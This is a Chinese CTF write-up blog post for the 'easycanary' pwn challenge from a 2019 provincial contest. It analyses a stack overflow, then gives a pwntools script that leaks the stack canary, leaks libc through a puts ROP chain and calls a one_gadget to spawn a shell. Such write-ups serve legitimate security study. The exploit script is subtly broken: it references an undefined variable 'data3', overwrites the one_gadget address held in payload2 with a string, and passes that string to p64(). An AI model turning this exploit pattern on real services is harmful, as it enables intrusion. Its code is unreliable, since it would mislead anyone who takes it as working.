---
layout:     post   			        # 使用的布局（不需要改）
title:      吉林网络安全省赛   			# 标题 
subtitle:   jeasycanary writeup  			#副标题
date:       2019-05-24 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

## Overview
> Safeguard、operation and analysis

'''
pic@ubuntu:~/Desktop/pwn$ checksec easycanary
[*] '/home/pic/Desktop/pwn/easycanary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

pic@ubuntu:~/Desktop/pwn$ ./easycanary 
welcome any
learn some canary challenge
input your name
1
hello 1����
Let's start a game, can you guess the keyword?
1
fail
'''

可以看到本题开了nx和canary，我们逻辑看了个大概，下面到*ida*中具体分析，主函数没啥看的，直接到`name()`函数中看

```
unsigned __int64 name()
{
  char buf; // [rsp+0h] [rbp-30h]
  char v2; // [rsp+10h] [rbp-20h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("input your name");
  readi(&v2, 24LL);
  printf("hello %s\n", &v2);
  puts("Let's start a game, can you guess the keyword?");
  read(0, &buf, 0x90uLL);
  if ( !strcmp(&buf, keyword) )
    puts("good boy\n");
  else
    puts("fail");
  return __readfsqword(0x28u) ^ v3;
}
```

## Thinking
> how to exploit vulnerability

可以看到两个溢出，一个泄露canary，一个直接上shellcode就行，所以思路如下：
 - 在`readi(&v2, 24LL)`把'\x00'抹掉，从而泄露canary
 - 用`pop rdi`把puts真实地址找出来，从而算偏移
 - 利用`one_gadget`把`execve("/bin/sh")`找到
 - 然后再调用一遍`main()`函数直接起shell即可

## Summary

本题要点就是canary，知道这个就很简单了,exp如下

```
from pwn import *
p = process('./easycanary')
elf = ELF('./easycanary')
libc = ELF('./libc.so.6')
context.log_level = 'debug'

p.recvuntil('input your name\n')
p.send('A'*0x19)
#当然用sendline('A'*0x18)也行，相当于直接接了个'\n'
p.recvuntil('A'*0x18)
canary = u64(p.recv(8))
canary = canary - 0x41
print hex(canary)
p.recvuntil('guess the keyword?\n')

payload = 'qwertyuiopasdfghjklzxcvbnm' + '\x00'
payload += 'A'*(40-len(payload)) + p64(canary)
payload += 'A'*(56-len(payload)) +p64(0x400a53)+ p64(0x601018)+p64(0x400666)+ p64(0x4009AB)
p.sendline(payload)
p.recvuntil('good boy\n\n')
puts_got = u64(p.recv(6).ljust(8,'\x00'))
libc_base = puts_got - libc.symbols['puts']
payload2 = libc_base + 0x45216
print hex(payload2)

p.recvuntil(' your name\n')
p.send('A'*0x19)
p.recvuntil('A'*0x18)
canary = u64(p.recv(8))
canary = data3 - 0x41
print hex(canary)
p.recvuntil('guess the keyword?\n')

payload2 = 'qwertyuiopasdfghjklzxcvbnm' + '\x00'
payload2 += 'A'*(40-len(payload2)) + p64(canary)
payload2 += 'A'*(56-len(payload2)) +p64(payload2)
#gdb.attach(p)
p.sendline(payload2)

p.interactive()
```
